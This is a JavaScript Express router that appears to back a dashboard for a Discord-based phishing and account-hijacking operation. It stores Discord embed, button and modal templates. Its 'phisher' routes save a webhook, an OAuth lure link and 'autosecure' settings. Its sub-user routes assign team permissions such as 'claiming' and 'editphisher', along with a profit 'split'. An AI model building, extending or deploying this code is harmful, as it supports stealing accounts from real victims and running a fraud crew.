const express = require('express');
const router = express.Router();
const { query, get, run } = require('../db');

// --- EMBEDS ---
router.get('/embeds', (req, res) => {
  try {
    const userId = req.user.id;
    const embeds = query('SELECT * FROM embeds WHERE user_id = ? ORDER BY id DESC', [userId]);
    res.json({ success: true, embeds });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

router.post('/embeds', (req, res) => {
  try {
    const userId = req.user.id;
    const { type = 'default', embed } = req.body;

    if (!embed) return res.status(400).json({ success: false, error: 'Embed data required' });

    const embedStr = typeof embed === 'object' ? JSON.stringify(embed) : embed;
    const existing = get('SELECT id FROM embeds WHERE user_id = ? AND type = ?', [userId, type]);

    if (existing) {
      run('UPDATE embeds SET embed = ? WHERE id = ?', [embedStr, existing.id]);
    } else {
      run('INSERT INTO embeds (user_id, type, embed) VALUES (?, ?, ?)', [userId, type, embedStr]);
    }

    res.json({ success: true, message: 'Embed configuration saved' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- BUTTONS ---
router.get('/buttons', (req, res) => {
  try {
    const userId = req.user.id;
    const buttons = query('SELECT * FROM buttons WHERE user_id = ? ORDER BY id DESC', [userId]);
    res.json({ success: true, buttons });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

router.post('/buttons', (req, res) => {
  try {
    const userId = req.user.id;
    const { type = 'default', button } = req.body;

    if (!button) return res.status(400).json({ success: false, error: 'Button data required' });

    const btnStr = typeof button === 'object' ? JSON.stringify(button) : button;
    const existing = get('SELECT id FROM buttons WHERE user_id = ? AND type = ?', [userId, type]);

    if (existing) {
      run('UPDATE buttons SET button = ? WHERE id = ?', [btnStr, existing.id]);
    } else {
      run('INSERT INTO buttons (user_id, type, button) VALUES (?, ?, ?)', [userId, type, btnStr]);
    }

    res.json({ success: true, message: 'Button configuration saved' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- MODALS ---
router.get('/modals', (req, res) => {
  try {
    const userId = req.user.id;
    const modals = query('SELECT * FROM modals WHERE user_id = ? ORDER BY id DESC', [userId]);
    res.json({ success: true, modals });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

router.post('/modals', (req, res) => {
  try {
    const userId = req.user.id;
    const { type = 'default', modal } = req.body;

    if (!modal) return res.status(400).json({ success: false, error: 'Modal data required' });

    const modalStr = typeof modal === 'object' ? JSON.stringify(modal) : modal;
    const existing = get('SELECT id FROM modals WHERE user_id = ? AND type = ?', [userId, type]);

    if (existing) {
      run('UPDATE modals SET modal = ? WHERE id = ?', [modalStr, existing.id]);
    } else {
      run('INSERT INTO modals (user_id, type, modal) VALUES (?, ?, ?)', [userId, type, modalStr]);
    }

    res.json({ success: true, message: 'Modal configuration saved' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- PRESETS ---
router.get('/presets', (req, res) => {
  try {
    const userId = req.user.id;
    const presets = query('SELECT * FROM presets WHERE user_id = ? ORDER BY id DESC', [userId]);
    res.json({ success: true, presets });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

router.post('/presets', (req, res) => {
  try {
    const userId = req.user.id;
    const { name, preset, buttonlabel, buttonlink } = req.body;

    if (!name || !preset) return res.status(400).json({ success: false, error: 'Name and preset data required' });

    const presetStr = typeof preset === 'object' ? JSON.stringify(preset) : preset;
    const now = Date.now();

    run(
      'INSERT INTO presets (user_id, name, preset, buttonlabel, buttonlink, time) VALUES (?, ?, ?, ?, ?, ?)',
      [userId, name.trim(), presetStr, buttonlabel || '', buttonlink || '', now]
    );

    res.json({ success: true, message: 'Preset saved!' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

router.delete('/presets/:id', (req, res) => {
  try {
    const userId = req.user.id;
    const { id } = req.params;

    if (req.user.isAdmin) {
      run('DELETE FROM presets WHERE id = ?', [id]);
    } else {
      run('DELETE FROM presets WHERE id = ? AND user_id = ?', [id, userId]);
    }

    res.json({ success: true, message: 'Preset deleted' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- SUB-USERS / TEAM PERMISSIONS ---
router.get('/subusers', (req, res) => {
  try {
    const userId = req.user.id;
    const subusers = query('SELECT * FROM users WHERE user_id = ? ORDER BY id DESC', [userId]);
    res.json({ success: true, subusers });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

router.post('/subusers', (req, res) => {
  try {
    const userId = req.user.id;
    const {
      child,
      claiming = 1,
      usedmbuttons = 0,
      editclaiming = 0,
      editbuttons = 0,
      editbot = 0,
      editmodals = 0,
      editembeds = 0,
      editautosecure = 0,
      editphisher = 0,
      editpresets = 0,
      editblacklist = 0,
      usestatsbutton = 0,
      sendembeds = 0,
      split = 50
    } = req.body;

    if (!child) return res.status(400).json({ success: false, error: 'Sub-user Discord ID required' });

    const existing = get('SELECT id FROM users WHERE user_id = ? AND child = ?', [userId, child.trim()]);

    if (existing) {
      run(
        `UPDATE users SET 
          claiming=?, usedmbuttons=?, editclaiming=?, editbuttons=?, editbot=?, 
          editmodals=?, editembeds=?, editautosecure=?, editphisher=?, editpresets=?, 
          editblacklist=?, usestatsbutton=?, sendembeds=?, split=?
        WHERE id = ?`,
        [
          claiming, usedmbuttons, editclaiming, editbuttons, editbot,
          editmodals, editembeds, editautosecure, editphisher, editpresets,
          editblacklist, usestatsbutton, sendembeds, split, existing.id
        ]
      );
    } else {
      run(
        `INSERT INTO users (
          user_id, child, claiming, usedmbuttons, editclaiming, editbuttons, editbot, 
          editmodals, editembeds, editautosecure, editphisher, editpresets, 
          editblacklist, usestatsbutton, sendembeds, split
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [
          userId, child.trim(), claiming, usedmbuttons, editclaiming, editbuttons, editbot,
          editmodals, editembeds, editautosecure, editphisher, editpresets,
          editblacklist, usestatsbutton, sendembeds, split
        ]
      );
    }

    res.json({ success: true, message: 'Sub-user permissions saved!' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

router.delete('/subusers/:child', (req, res) => {
  try {
    const userId = req.user.id;
    const { child } = req.params;

    run('DELETE FROM users WHERE user_id = ? AND child = ?', [userId, child]);
    res.json({ success: true, message: 'Sub-user removed' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- PHISHER CONFIG ---
router.get('/phisher', (req, res) => {
  try {
    const userId = req.user.id;
    const row = get('SELECT webhook, oauth_link, validateusername, aftersecure, ping, blacklistemails FROM autosecure WHERE user_id = ? ORDER BY id ASC LIMIT 1', [userId]);

    res.json({
      success: true,
      phisher: row || {
        webhook: '',
        oauth_link: '',
        validateusername: 1,
        aftersecure: 'nothing',
        ping: '@everyone',
        blacklistemails: 1
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

router.post('/phisher', (req, res) => {
  try {
    const userId = req.user.id;
    const { webhook, oauth_link, validateusername = 1, aftersecure = 'nothing', ping = '@everyone', blacklistemails = 1 } = req.body;

    run(
      `UPDATE autosecure SET 
        webhook = ?, oauth_link = ?, validateusername = ?, aftersecure = ?, ping = ?, blacklistemails = ? 
      WHERE user_id = ?`,
      [webhook || '', oauth_link || '', validateusername, aftersecure, ping, blacklistemails, userId]
    );

    res.json({ success: true, message: 'Phisher configuration updated' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

module.exports = router;
